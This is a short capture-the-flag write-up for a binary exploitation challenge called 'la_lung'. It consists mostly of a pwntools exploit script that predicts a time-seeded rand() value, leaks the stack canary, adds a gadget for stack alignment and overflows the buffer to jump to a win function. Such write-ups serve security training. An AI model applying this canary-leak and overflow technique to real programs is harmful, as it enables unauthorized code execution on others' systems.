# Challenge: la_lung
## Description

> I forgot the description :)) but it's roughly "If you solved it locally but failed remotely, try again"

## Source
> la_lung
## Solution
Note: **srand(time(0))** and **Stack Alignment**
```

#!/usr/bin/python3

##By shibajutsu and Gnas

import math
from ctypes import CDLL
from pwn import *

context.binary = elf = ELF('./la_lung', checksec=False)
libc = CDLL('libc.so.6')

p = process(elf.path)
# p = remote('167.172.3.35', 50010)

now = int(math.floor(time.time()))
libc.srand(now)

p.sendlineafter(b'name: ', b'a'*72)
canary = p.recvline().split(b' ')[-1][64:72]
canary = b'\x00' + canary[1:]
print(canary)
print(p64(u64(canary))) 

p.sendlineafter(b'Door\n', str(libc.rand()).encode())

address = p.recvline().split(b' ')[-1].strip()

address_win = int(address, 16)
gadget = address_win - (0x12a9-0x101a)
print(hex(address_win))

address = p64(int(address, 16))
print(address)

print(p.recvline())

p.sendline(b'A' * 88 + canary+ p64(0x1)+p64(gadget) + address)
p.interactive()
```
